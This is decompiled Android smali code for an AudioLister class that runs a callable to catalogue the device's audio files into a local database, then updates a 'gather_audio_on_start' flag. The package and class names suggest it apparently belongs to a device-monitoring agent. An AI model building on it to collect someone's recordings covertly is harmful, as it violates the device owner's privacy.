.class public Lcom/hp/vd/module/monitor/audio/AudioLister;
.super Ljava/lang/Object;
.source "AudioLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "AudioMonitor::AudioLister"


# instance fields
.field protected audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AudioData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/audio/AudioObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AudioData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/audio/AudioObserver;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 37
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->contentResolver:Landroid/content/ContentResolver;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->contentUri:Landroid/net/Uri;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 27
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 38
    iput-object p1, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->contentResolver:Landroid/content/ContentResolver;

    .line 39
    iput-object p2, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->contentUri:Landroid/net/Uri;

    .line 40
    iput-object p3, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 41
    iput-object p4, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 42
    iput-object p5, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    .line 43
    iput-object p6, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 44
    iput-object p7, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .line 49
    iget-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/audio/AudioObserver;->deactivate()Z

    .line 51
    new-instance v0, Lcom/hp/vd/module/monitor/audio/AudioCallable;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v8, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v1, v0

    invoke-direct/range {v1 .. v8}, Lcom/hp/vd/module/monitor/audio/AudioCallable;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/audio/AudioObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 62
    :try_start_0
    invoke-interface {v0}, Ljava/util/concurrent/Callable;->call()Ljava/lang/Object;

    .line 64
    iget-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "gather_audio_on_start"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 65
    iget-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 67
    iget-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/audio/AudioObserver;->activate()Z
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 77
    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "AudioMonitor::AudioLister"

    const-string v3, "Exception caught durring callable.call()."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 70
    invoke-virtual {v0}, Ljava/sql/SQLException;->printStackTrace()V

    .line 72
    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "AudioMonitor::AudioLister"

    const-string v3, "run(): SQL Exception: either the Callable or the Commit(maxId) has failed."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
